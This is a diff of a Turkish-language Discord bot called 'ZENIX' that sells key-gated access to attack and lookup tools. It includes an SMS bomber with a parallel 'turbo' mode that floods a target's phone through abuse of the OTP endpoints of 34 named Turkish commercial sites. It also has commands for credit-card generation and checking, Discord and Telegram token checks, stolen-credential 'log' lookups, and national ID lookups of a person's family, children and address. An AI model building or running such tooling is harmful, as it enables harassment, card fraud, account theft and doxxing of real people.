-            self.uysal, self.yapp, self.beefull, self.dominos, self.frink,
-            self.bodrum, self.kofteciyusuf, self.orwi, self.coffy, self.hamidiye,
-            self.money, self.alixavien, self.jimmykey, self.ido,
-        ]
-
-    def run_normal(self, adet=1):
-        services = self.get_services()
-        for _ in range(adet):
-            for svc in services:
-                try: svc()
-                except: pass
-
-    async def run_normal_async(self, adet=1):
-        await asyncio.to_thread(self.run_normal, adet)
-
-    async def run_turbo(self, adet=1):
-        services = self.get_services()
-        for _ in range(adet):
-            tasks = [asyncio.to_thread(svc) for svc in services]
-            await asyncio.gather(*tasks)
-
+# ==================== BOT ====================
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 # ==================== READY ====================
 @bot.event
@@ -614,154 +204,118 @@ async def on_ready():
     print(f"🌐 {len(bot.guilds)} sunucuda")
     print(f"🏠 İzinli: {DB['guilds']}")
     try:
-        synced = await bot.tree.sync()
-        print(f"🔁 {len(synced)} komut yüklendi.")
-    except Exception as e:
-        print(f"❌ Sync: {e}")
+        s = await bot.tree.sync()
+        print(f"🔁 {len(s)} komut yüklendi.")
+    except Exception as e: print(f"❌ Sync: {e}")
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="zenix.bond"))
-
 
 @bot.event
 async def on_member_join(member):
     if not is_allowed_guild(member.guild.id): return
     for ch in member.guild.text_channels:
         if ch.permissions_for(member.guild.me).send_messages:
-            try:
-                await ch.send(content=f"{member.mention} sunucuya katıldı! 🎉", embed=build_welcome_embed())
+            try: await ch.send(content=f"{member.mention} katıldı! 🎉", embed=build_welcome_embed())
             except: pass
             break
 
-
 # ==================== ANAHTAR KOMUTLARI ====================
 @bot.tree.command(name="anahtargir", description="ZENIX anahtarını gir")
-@app_commands.describe(anahtar="Sana verilen anahtar (ZENIX-XXXX-XXXX-XXXX)")
+@app_commands.describe(anahtar="ZENIX-XXXX-XXXX-XXXX")
 async def anahtargir(interaction, anahtar: str):
     if interaction.guild is None:
         await interaction.response.send_message("❌ Sunucuda kullan.", ephemeral=True); return
     if not is_allowed_guild(interaction.guild.id):
-        await interaction.response.send_message("❌ Bu sunucuda izin yok.", ephemeral=True); return
-
+        await interaction.response.send_message("❌ İzin yok.", ephemeral=True); return
     anahtar = anahtar.strip().upper()
-
     if user_has_key(interaction.user.id):
-        await interaction.response.send_message(f"✅ Zaten anahtarın var: `{get_user_key(interaction.user.id)}`", ephemeral=True); return
-
+        await interaction.response.send_message(f"✅ Zaten: `{get_user_key(interaction.user.id)}`", ephemeral=True); return
     if anahtar not in DB["keys"]:
-        await interaction.response.send_message("❌ **Geçersiz anahtar.**", ephemeral=True); return
-
-    key_info = DB["keys"][anahtar]
-    if key_info.get("user_id") and key_info["user_id"] != interaction.user.id:
-        await interaction.response.send_message("❌ Bu anahtar başkasına ait.", ephemeral=True); return
-
+        await interaction.response.send_message("❌ Geçersiz anahtar.", ephemeral=True); return
+    ki = DB["keys"][anahtar]
+    if ki.get("user_id") and ki["user_id"] != interaction.user.id:
+        await interaction.response.send_message("❌ Başkasına ait.", ephemeral=True); return
     register_key(interaction.user.id, anahtar)
+    e = discord.Embed(title="✅ Anahtar Aktif", description=f"Hoş geldin {interaction.user.mention}!", color=COLOR_OK, timestamp=datetime.datetime.utcnow())
+    e.add_field(name="🔑 Anahtarın", value=f"`{anahtar}`", inline=False)
+    e.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=e, ephemeral=True)
 
-    embed = discord.Embed(title="✅ Anahtar Aktif",
-        description=f"Hoş geldin {interaction.user.mention}!\nArtık tüm komutları kullanabilirsin.",
-        color=COLOR_OK, timestamp=datetime.datetime.utcnow())
-    embed.add_field(name="🔑 Anahtarın", value=f"`{anahtar}`", inline=False)
-    embed.set_thumbnail(url=LOGO_URL)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
-
-@bot.tree.command(name="anahtarolustur", description="[ADMIN] Yeni anahtar oluşturur")
-@app_commands.describe(kullanici="Anahtarı vereceğin kullanıcı")
+@bot.tree.command(name="anahtarolustur", description="[ADMIN] Yeni anahtar")
+@app_commands.describe(kullanici="Kullanıcı")
 async def anahtarolustur(interaction, kullanici: discord.Member):
     if not is_admin(interaction.user.id):
         await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True); return
-
-    new_key = generate_key()
-    while new_key in DB["keys"]:
-        new_key = generate_key()
-
-    DB["keys"][new_key] = {"user_id": None, "created_at": datetime.datetime.utcnow().isoformat()}
+    nk = generate_key()
+    while nk in DB["keys"]: nk = generate_key()
+    DB["keys"][nk] = {"user_id": None, "created_at": datetime.datetime.utcnow().isoformat()}
     save_db()
-
-    embed = discord.Embed(title="🔑 Yeni Anahtar", description=f"Kullanıcı: {kullanici.mention}",
-        color=COLOR_OK, timestamp=datetime.datetime.utcnow())
-    embed.add_field(name="Anahtar", value=f"`{new_key}`", inline=False)
-    embed.add_field(name="Kullanım", value=f"`/anahtargir anahtar:{new_key}`", inline=False)
-    embed.set_thumbnail(url=LOGO_URL)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-    try:
-        await kullanici.send(f"🔑 **ZENIX Anahtarın:** `{new_key}`\nSunucuda `/anahtargir` ile aktif et.")
+    e = discord.Embed(title="🔑 Yeni Anahtar", description=f"Kullanıcı: {kullanici.mention}", color=COLOR_OK, timestamp=datetime.datetime.utcnow())
+    e.add_field(name="Anahtar", value=f"`{nk}`", inline=False)
+    e.add_field(name="Kullanım", value=f"`/anahtargir anahtar:{nk}`", inline=False)
+    e.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=e, ephemeral=True)
+    try: await kullanici.send(f"🔑 **ZENIX Anahtarın:** `{nk}`\n`/anahtargir` ile aktif et.")
     except: pass
 
-
-@bot.tree.command(name="anahtarsil", description="[ADMIN] Kullanıcının anahtarını siler")
-@app_commands.describe(kullanici="Anahtarı silinecek kullanıcı")
+@bot.tree.command(name="anahtarsil", description="[ADMIN] Anahtar sil")
+@app_commands.describe(kullanici="Kullanıcı")
 async def anahtarsil(interaction, kullanici: discord.Member):
     if not is_admin(interaction.user.id):
         await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True); return
     uid = str(kullanici.id)
     if uid not in DB["user_keys"]:
-        await interaction.response.send_message("❌ Bu kullanıcının anahtarı yok.", ephemeral=True); return
-    key = DB["user_keys"].pop(uid)
-    if key in DB["keys"]: DB["keys"].pop(key)
+        await interaction.response.send_message("❌ Anahtarı yok.", ephemeral=True); return
+    k = DB["user_keys"].pop(uid)
+    if k in DB["keys"]: DB["keys"].pop(k)
     save_db()
-    await interaction.response.send_message(f"✅ {kullanici.mention} anahtarı silindi.", ephemeral=True)
+    await interaction.response.send_message(f"✅ {kullanici.mention} silindi.", ephemeral=True)
 
-
-@bot.tree.command(name="anahtarlistesi", description="[ADMIN] Tüm anahtarları listeler")
+@bot.tree.command(name="anahtarlistesi", description="[ADMIN] Anahtar listesi")
 async def anahtarlistesi(interaction):
     if not is_admin(interaction.user.id):
         await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True); return
     if not DB["keys"]:
-        await interaction.response.send_message("📭 Hiç anahtar yok.", ephemeral=True); return
-    lines = []
-    for k, v in DB["keys"].items():
-        uid = v.get("user_id")
-        lines.append(f"✅ `{k}` → <@{uid}>" if uid else f"🆓 `{k}` → (boşta)")
-    text = "\n".join(lines)
-    if len(text) > 1900: text = text[:1900] + "\n..."
-    embed = discord.Embed(title=f"🔑 Anahtar Listesi ({len(DB['keys'])})", description=text, color=COLOR_Z)
-    embed.set_thumbnail(url=LOGO_URL)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
+        await interaction.response.send_message("📭 Boş.", ephemeral=True); return
+    lines = [f"✅ `{k}` → <@{v.get('user_id')}>" if v.get("user_id") else f"🆓 `{k}` → boşta" for k, v in DB["keys"].items()]
+    t = "\n".join(lines)
+    if len(t) > 1900: t = t[:1900] + "\n..."
+    e = discord.Embed(title=f"🔑 Anahtarlar ({len(DB['keys'])})", description=t, color=COLOR_Z)
+    e.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=e, ephemeral=True)
 
 # ==================== SUNUCU KOMUTLARI ====================
-@bot.tree.command(name="sunucuekle", description="[ADMIN] Yeni sunucu ekler ve davet linki verir")
-@app_commands.describe(sunucu_id="Eklenecek sunucunun ID'si")
+@bot.tree.command(name="sunucuekle", description="[ADMIN] Sunucu ekle + davet linki")
+@app_commands.describe(sunucu_id="Sunucu ID")
 async def sunucuekle(interaction, sunucu_id: str):
     if not is_admin(interaction.user.id):
         await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True); return
-    try:
-        gid = int(sunucu_id.strip())
-    except ValueError:
-        await interaction.response.send_message("❌ Geçersiz ID.", ephemeral=True); return
+    try: gid = int(sunucu_id.strip())
+    except: await interaction.response.send_message("❌ Geçersiz ID.", ephemeral=True); return
     if gid in DB["guilds"]:
         await interaction.response.send_message(f"ℹ️ Zaten ekli: `{gid}`", ephemeral=True); return
     DB["guilds"].append(gid); save_db()
-    invite_url = discord.utils.oauth_url(
-        bot.user.id,
-        permissions=discord.Permissions(administrator=True),
-        scopes=("bot", "applications.commands"),
-        guild=discord.Object(id=gid)
-    )
-    embed = discord.Embed(title="✅ Sunucu Eklendi", description=f"`{gid}` listeye eklendi.", color=COLOR_OK)
-    embed.add_field(name="🔗 Davet Linki", value=f"[Tıkla]({invite_url})", inline=False)
-    embed.add_field(name="📋 Kopyala", value=f"```\n{invite_url}\n```", inline=False)
-    embed.set_thumbnail(url=LOGO_URL)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
+    url = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions(administrator=True), scopes=("bot", "applications.commands"), guild=discord.Object(id=gid))
+    e = discord.Embed(title="✅ Sunucu Eklendi", description=f"`{gid}` listeye eklendi.", color=COLOR_OK)
+    e.add_field(name="🔗 Davet Linki", value=f"[Tıkla]({url})", inline=False)
+    e.add_field(name="📋 Kopyala", value=f"```\n{url}\n```", inline=False)
+    e.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=e, ephemeral=True)
 
-
-@bot.tree.command(name="sunuculistesi", description="[ADMIN] İzinli sunucuları listeler")
+@bot.tree.command(name="sunuculistesi", description="[ADMIN] İzinli sunucular")
 async def sunuculistesi(interaction):
     if not is_admin(interaction.user.id):
         await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True); return
-    embed = discord.Embed(title=f"🏠 İzinli Sunucular ({len(DB['guilds'])})",
-        description="\n".join(f"• `{g}`" for g in DB["guilds"]), color=COLOR_Z)
-    embed.set_thumbnail(url=LOGO_URL)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
+    e = discord.Embed(title=f"🏠 İzinli ({len(DB['guilds'])})", description="\n".join(f"• `{g}`" for g in DB["guilds"]), color=COLOR_Z)
+    e.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=e, ephemeral=True)
 
-
-@bot.tree.command(name="sunucusil", description="[ADMIN] Sunucuyu listeden çıkarır")
-@app_commands.describe(sunucu_id="Silinecek sunucu ID")
+@bot.tree.command(name="sunucusil", description="[ADMIN] Sunucu sil")
+@app_commands.describe(sunucu_id="Sunucu ID")
 async def sunucusil(interaction, sunucu_id: str):
     if not is_admin(interaction.user.id):
         await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True); return
     try: gid = int(sunucu_id.strip())
-    except ValueError:
-        await interaction.response.send_message("❌ Geçersiz ID.", ephemeral=True); return
+    except: await interaction.response.send_message("❌ Geçersiz ID.", ephemeral=True); return
     if gid == MAIN_GUILD_ID:
         await interaction.response.send_message("❌ Ana sunucu silinemez.", ephemeral=True); return
     if gid not in DB["guilds"]:
@@ -769,423 +323,360 @@ async def sunucusil(interaction, sunucu_id: str):
     DB["guilds"].remove(gid); save_db()
     await interaction.response.send_message(f"✅ `{gid}` çıkarıldı.", ephemeral=True)
 
-
 # ==================== GRUPLAR ====================
-zenix_group  = app_commands.Group(name="zenix",  description="ZENIX - Genel Sorgular")
-zenix2_group = app_commands.Group(name="zenix2", description="ZENIX - TC & Kimlik")
-zenix3_group = app_commands.Group(name="zenix3", description="ZENIX - Ad/Soyad & Adres")
+zg  = app_commands.Group(name="zenix",  description="ZENIX - Genel")
+zg2 = app_commands.Group(name="zenix2", description="ZENIX - TC/Kimlik")
+zg3 = app_commands.Group(name="zenix3", description="ZENIX - Ad/Soyad")
 
-
-# ==================== /zenix — GENEL ====================
-@zenix_group.command(name="bedrock", description="MC Bedrock sunucu durumu")
-@app_commands.describe(adres="Sunucu adresi")
-async def z_bedrock(interaction, adres: str):
+# ==================== /zenix ====================
+@zg.command(name="bedrock", description="MC Bedrock")
+@app_commands.describe(adres="Adres")
+async def zb(interaction, adres: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY_API}/bedrock?adres={adres}"))
 
-
-@zenix_group.command(name="ccgen", description="Rastgele kart")
-async def z_ccgen(interaction):
+@zg.command(name="ccgen", description="Rastgele kart")
+async def zcc(interaction):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY_API}/ccgen"))
 
-
-@zenix_group.command(name="cccheck", description="Kart kontrol")
-@app_commands.describe(data="Kart verisi")
-async def z_cccheck(interaction, data: str):
+@zg.command(name="cccheck", description="Kart kontrol")
+@app_commands.describe(data="Kart")
+async def zccc(interaction, data: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY_API}/check?data={data}"))
 
-
-@zenix_group.command(name="dctoken", description="Discord token testi")
+@zg.command(name="dctoken", description="Discord token test")
 @app_commands.describe(token="Token")
-async def z_dctoken(interaction, token: str):
+async def zdt(interaction, token: str):
     if not await precheck(interaction): return
     await interaction.response.defer(ephemeral=True)
     await send_result(interaction, await fetch_json(f"{WAZELY_API}/dcbottokencheck?token={token}"))
 
-
-@zenix_group.command(name="tgtoken", description="Telegram token testi")
+@zg.command(name="tgtoken", description="Telegram token test")
 @app_commands.describe(token="Token")
-async def z_tgtoken(interaction, token: str):
+async def ztt(interaction, token: str):
     if not await precheck(interaction): return
     await interaction.response.defer(ephemeral=True)
     await send_result(interaction, await fetch_json(f"{WAZELY_API}/tgtokencheck?token={token}"))
 
-
-@zenix_group.command(name="trlog", description="TR log")
+@zg.command(name="trlog", description="TR log")
 @app_commands.describe(site="Site")
-async def z_trlog(interaction, site: str):
+async def ztl(interaction, site: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/trlog?site={site}"))
 
-
-@zenix_group.command(name="log", description="Site log")
+@zg.command(name="log", description="Site log")
 @app_commands.describe(url="Domain")
-async def z_log(interaction, url: str):
+async def zl(interaction, url: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SOLIDARK}/log.php?url={url}"))
 
-
-@zenix_group.command(name="eczane", description="Eczane sorgusu")
-@app_commands.describe(ad="Eczane adı")
-async def z_eczane(interaction, ad: str):
+@zg.command(name="eczane", description="Eczane")
+@app_commands.describe(ad="Ad")
+async def ze(interaction, ad: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/eczane?ad={ad}"))
 
-
-@zenix_group.command(name="ipinfo", description="IP bilgisi")
+@zg.command(name="ipinfo", description="IP bilgi")
 @app_commands.describe(ip="IP")
-async def z_ipinfo(interaction, ip: str):
+async def zip(interaction, ip: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/ipinfo?ip={ip}"))
 
-
-@zenix_group.command(name="dns", description="DNS sorgu")
+@zg.command(name="dns", description="DNS")
 @app_commands.describe(domain="Domain")
-async def z_dns(interaction, domain: str):
+async def zd(interaction, domain: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/dns?domain={domain}"))
 
-
-@zenix_group.command(name="bahis", description="Bahis sorgu")
-@app_commands.describe(isimsoyisim="İsim Soyisim")
-async def z_bahis(interaction, isimsoyisim: str):
+@zg.command(name="bahis", description="Bahis")
+@app_commands.describe(isimsoyisim="İsim")
+async def zba(interaction, isimsoyisim: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/bahis?isimsoyisim={isimsoyisim}"))
 
-
-@zenix_group.command(name="exxengen", description="Exxen hesap gen")
-async def z_exxengen(interaction):
+@zg.command(name="exxengen", description="Exxen gen")
+async def zex(interaction):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/exxengen"))
 
-
-@zenix_group.command(name="nitrogen", description="Nitro kodları")
+@zg.command(name="nitrogen", description="Nitro")
 @app_commands.describe(count="Adet")
-async def z_nitro(interaction, count: Optional[int] = 10):
+async def zn(interaction, count: Optional[int] = 10):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/fakeNitro?count={count}"))
 
-
-@zenix_group.command(name="pingtest", description="Ping testi")
+@zg.command(name="pingtest", description="Ping test")
 @app_commands.describe(target="Hedef")
-async def z_pingtest(interaction, target: str):
+async def zpt(interaction, target: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/ping?target={target}"))
 
-
-@zenix_group.command(name="plaka", description="Plaka sorgu")
+@zg.command(name="plaka", description="Plaka")
 @app_commands.describe(plate="Plaka")
-async def z_plaka(interaction, plate: str):
+async def zpl(interaction, plate: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/plaka?plate={plate}"))
 
-
-@zenix_group.command(name="predunyam", description="Predunyam gen")
-async def z_predunyam(interaction):
+@zg.command(name="predunyam", description="Predunyam")
+async def zpr(interaction):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/predunyam"))
 
-
-@zenix_group.command(name="useragent", description="Rastgele UA")
-async def z_useragent(interaction):
+@zg.command(name="useragent", description="UA")
+async def zua(interaction):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{WAZELY}/randomuseragent"))
 
-
 # ==================== SMS BOMBER ====================
-@zenix_group.command(name="smsbomber", description="SMS Bomber - Normal")
-@app_commands.describe(numara="Telefon (5XXXXXXXXX)", adet="Tur (max 10)", mail="Mail (ops.)")
-async def z_smsbomber(interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
+@zg.command(name="smsbomber", description="SMS Bomber - Normal")
+@app_commands.describe(numara="Telefon", adet="Tur (max 10)", mail="Mail (ops.)")
+async def zsb(interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
     if not await precheck(interaction): return
     await interaction.response.defer()
     adet = max(1, min(adet, 10))
-    bomber = SmsBomber(numara, mail or "")
+    b = SmsBomber(numara, mail or "")
     start = time.time()
-    embed = discord.Embed(title="💣 ZENIX SMS BOMBER - NORMAL",
-        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏳ Çalışıyor...",
-        color=COLOR_Z, timestamp=datetime.datetime.utcnow())
-    embed.set_thumbnail(url=LOGO_URL)
-    msg = await interaction.followup.send(embed=embed)
-
-    await bomber.run_normal_async(adet)
-    elapsed = round(time.time() - start, 2)
-
-    ok = sum(1 for _, v in bomber.results if v)
-    fail = len(bomber.results) - ok
+    e = discord.Embed(title="💣 SMS BOMBER - NORMAL", description=f"📱 `{numara}` | 🔁 {adet} | ⏳ Çalışıyor...", color=COLOR_Z, timestamp=datetime.datetime.utcnow())
+    e.set_thumbnail(url=LOGO_URL)
+    msg = await interaction.followup.send(embed=e)
+    await b.run_normal_async(adet)
+    el = round(time.time() - start, 2)
+    ok = sum(1 for _, v in b.results if v)
+    fl = len(b.results) - ok
     summary = {}
-    for name, status in bomber.results:
-        summary.setdefault(name, {"ok": 0, "fail": 0})
-        if status: summary[name]["ok"] += 1
-        else:      summary[name]["fail"] += 1
+    for n, s in b.results:
+        summary.setdefault(n, {"ok": 0, "fail": 0})
+        if s: summary[n]["ok"] += 1
+        else: summary[n]["fail"] += 1
     lines = [f"{'✅' if s['ok']>0 else '❌'} `{n}` → {s['ok']}✅ / {s['fail']}❌" for n, s in summary.items()]
     full = "\n".join(lines)
-
-    embed = discord.Embed(title="💣 ZENIX SMS BOMBER - NORMAL",
-        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
-        color=COLOR_OK, timestamp=datetime.datetime.utcnow())
-    embed.add_field(name="📊 Özet", value=f"✅ **{ok}** | ❌ **{fail}**", inline=False)
-    embed.set_thumbnail(url=LOGO_URL)
+    e = discord.Embed(title="💣 SMS BOMBER - NORMAL", description=f"📱 `{numara}` | 🔁 {adet} | ⏱️ {el}s", color=COLOR_OK, timestamp=datetime.datetime.utcnow())
+    e.add_field(name="📊 Özet", value=f"✅ **{ok}** | ❌ **{fl}**", inline=False)
+    e.set_thumbnail(url=LOGO_URL)
     if len(full) > 1000:
-        file = discord.File(io.BytesIO(full.encode("utf-8")), filename="zenix_sms.txt")
-        await msg.edit(embed=embed)
-        await interaction.followup.send(file=file)
+        f = discord.File(io.BytesIO(full.encode("utf-8")), filename="zenix_sms.txt")
+        await msg.edit(embed=e)
+        await interaction.followup.send(file=f)
     else:
-        embed.add_field(name="🔍 Detay", value=full or "Sonuç yok", inline=False)
-        await msg.edit(embed=embed)
+        e.add_field(name="🔍 Detay", value=full or "Yok", inline=False)
+        await msg.edit(embed=e)
 
-
-@zenix_group.command(name="turbo", description="SMS Bomber - Turbo (paralel)")
-@app_commands.describe(numara="Telefon (5XXXXXXXXX)", adet="Tur (max 10)", mail="Mail (ops.)")
-async def z_turbo(interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
+@zg.command(name="turbo", description="SMS Bomber - Turbo")
+@app_commands.describe(numara="Telefon", adet="Tur (max 10)", mail="Mail (ops.)")
+async def ztb(interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
     if not await precheck(interaction): return
     await interaction.response.defer()
     adet = max(1, min(adet, 10))
-    bomber = SmsBomber(numara, mail or "")
+    b = SmsBomber(numara, mail or "")
     start = time.time()
-    embed = discord.Embed(title="🚀 ZENIX SMS BOMBER - TURBO",
-        description=f"📱 `{numara}` | 🔁 {adet} tur | ⚡ Paralel...",
-        color=COLOR_Z, timestamp=datetime.datetime.utcnow())
-    embed.set_thumbnail(url=LOGO_URL)
-    msg = await interaction.followup.send(embed=embed)
-
-    await bomber.run_turbo(adet)
-    elapsed = round(time.time() - start, 2)
-
-    ok = sum(1 for _, v in bomber.results if v)
-    fail = len(bomber.results) - ok
+    e = discord.Embed(title="🚀 SMS BOMBER - TURBO", description=f"📱 `{numara}` | 🔁 {adet} | ⚡ Paralel...", color=COLOR_Z, timestamp=datetime.datetime.utcnow())
+    e.set_thumbnail(url=LOGO_URL)
+    msg = await interaction.followup.send(embed=e)
+    await b.run_turbo(adet)
+    el = round(time.time() - start, 2)
+    ok = sum(1 for _, v in b.results if v)
+    fl = len(b.results) - ok
     summary = {}
-    for name, status in bomber.results:
-        summary.setdefault(name, {"ok": 0, "fail": 0})
-        if status: summary[name]["ok"] += 1
-        else:      summary[name]["fail"] += 1
+    for n, s in b.results:
+        summary.setdefault(n, {"ok": 0, "fail": 0})
+        if s: summary[n]["ok"] += 1
+        else: summary[n]["fail"] += 1
     lines = [f"{'✅' if s['ok']>0 else '❌'} `{n}` → {s['ok']}✅ / {s['fail']}❌" for n, s in summary.items()]
     full = "\n".join(lines)
-
-    embed = discord.Embed(title="🚀 ZENIX SMS BOMBER - TURBO",
-        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
-        color=COLOR_OK, timestamp=datetime.datetime.utcnow())
-    embed.add_field(name="📊 Özet", value=f"✅ **{ok}** | ❌ **{fail}**", inline=False)
-    embed.set_thumbnail(url=LOGO_URL)
+    e = discord.Embed(title="🚀 SMS BOMBER - TURBO", description=f"📱 `{numara}` | 🔁 {adet} | ⏱️ {el}s", color=COLOR_OK, timestamp=datetime.datetime.utcnow())
+    e.add_field(name="📊 Özet", value=f"✅ **{ok}** | ❌ **{fl}**", inline=False)
+    e.set_thumbnail(url=LOGO_URL)
     if len(full) > 1000:
-        file = discord.File(io.BytesIO(full.encode("utf-8")), filename="zenix_turbo.txt")
-        await msg.edit(embed=embed)
-        await interaction.followup.send(file=file)
+        f = discord.File(io.BytesIO(full.encode("utf-8")), filename="zenix_turbo.txt")
+        await msg.edit(embed=e)
+        await interaction.followup.send(file=f)
     else:
-        embed.add_field(name="🔍 Detay", value=full or "Sonuç yok", inline=False)
-        await msg.edit(embed=embed)
+        e.add_field(name="🔍 Detay", value=full or "Yok", inline=False)
+        await msg.edit(embed=e)
 
-
-@zenix_group.command(name="servisler", description="SMS servis listesi")
-async def z_servisler(interaction):
+@zg.command(name="servisler", description="SMS servis listesi")
+async def zsv(interaction):
     if not await precheck(interaction): return
-    services = ["kahvedunyasi.com","wmf.com.tr","bim.veesk.net","englishhome.com","suiste.com","kimgb","evidea.com","345dijital.com","tiklagelsin.com","naosstars.com","koton.com","hayatsu.com.tr","hizliecza.net","metro-tr.com","filemarket.com.tr","akasya.com.tr","akbati.com","komagene.com.tr","porty.tech","tasdelen","uysalmarket.com.tr","yapp.com.tr","beefull.io","dominos.com.tr","frink.com.tr","bodrum.bel.tr","kofteciyusuf.com","orwi.app","coffy.com.tr","hamidiye.istanbul","money.com.tr","alixavien.com.tr","jimmykey.com","ido.com.tr"]
-    embed = discord.Embed(title="📋 ZENIX SMS - Servisler", description=f"**{len(services)}** servis", color=COLOR_Z)
-    half = len(services) // 2
-    embed.add_field(name="(1)", value="\n".join(f"• `{s}`" for s in services[:half]), inline=True)
-    embed.add_field(name="(2)", value="\n".join(f"• `{s}`" for s in services[half:]), inline=True)
-    embed.set_thumbnail(url=LOGO_URL)
-    await interaction.response.send_message(embed=embed)
+    e = discord.Embed(title="📋 SMS Servisler", description=f"Toplam **{len(SERVICE_NAMES)}** servis", color=COLOR_Z)
+    half = len(SERVICE_NAMES) // 2
+    e.add_field(name="Servisler (1)", value="\n".join(f"• `{s}`" for s in SERVICE_NAMES[:half]), inline=True)
+    e.add_field(name="Servisler (2)", value="\n".join(f"• `{s}`" for s in SERVICE_NAMES[half:]), inline=True)
+    e.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=e)
 
-
-# ==================== /zenix2 — TC/KİMLİK ====================
-@zenix2_group.command(name="tc", description="TC sorgu")
+# ==================== /zenix2 ====================
+@zg2.command(name="tc", description="TC")
 @app_commands.describe(tc="TC")
-async def z2_tc(interaction, tc: str):
+async def z2tc(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
-    data = await fetch_json(f"{SOLIDARK}/tc.php?tc={tc}")
-    if clean_data(data) is None:
-        data = await fetch_json(f"{SEARCHULP}/tc/{tc}?key={SEARCH_KEY}")
-    await send_result(interaction, data)
+    d = await fetch_json(f"{SOLIDARK}/tc.php?tc={tc}")
+    if clean_data(d) is None: d = await fetch_json(f"{SEARCHULP}/tc/{tc}?key={SEARCH_KEY}")
+    await send_result(interaction, d)
 
-
-@zenix2_group.command(name="tcpro", description="TC Pro")
+@zg2.command(name="tcpro", description="TC Pro")
 @app_commands.describe(tc="TC")
-async def z2_tcpro(interaction, tc: str):
+async def z2tcp(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
-    data = await fetch_json(f"{SOLIDARK}/tcpro.php?tc={tc}")
-    if clean_data(data) is None:
-        data = await fetch_json(f"{SEARCHULP}/tc/{tc}?key={SEARCH_KEY}")
-    await send_result(interaction, data)
+    d = await fetch_json(f"{SOLIDARK}/tcpro.php?tc={tc}")
+    if clean_data(d) is None: d = await fetch_json(f"{SEARCHULP}/tc/{tc}?key={SEARCH_KEY}")
+    await send_result(interaction, d)
 
-
-@zenix2_group.command(name="aile", description="Aile")
+@zg2.command(name="aile", description="Aile")
 @app_commands.describe(tc="TC")
-async def z2_aile(interaction, tc: str):
+async def z2a(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SEARCHULP}/aile/{tc}?key={SEARCH_KEY}"))
 
-
-@zenix2_group.command(name="ailepro", description="Aile Pro")
+@zg2.command(name="ailepro", description="Aile Pro")
 @app_commands.describe(tc="TC")
-async def z2_ailepro(interaction, tc: str):
+async def z2ap(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SOLIDARK}/ailepro.php?tc={tc}"))
 
-
-@zenix2_group.command(name="sulale", description="Sülale")
+@zg2.command(name="sulale", description="Sülale")
 @app_commands.describe(tc="TC")
-async def z2_sulale(interaction, tc: str):
+async def z2s(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SEARCHULP}/sulale/{tc}?key={SEARCH_KEY}"))
 
-
-@zenix2_group.command(name="cocuk", description="Çocuk")
+@zg2.command(name="cocuk", description="Çocuk")
 @app_commands.describe(tc="TC")
-async def z2_cocuk(interaction, tc: str):
+async def z2c(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SEARCHULP}/cocuk/{tc}?key={SEARCH_KEY}"))
 
-
-@zenix2_group.command(name="adres", description="Adres")
+@zg2.command(name="adres", description="Adres")
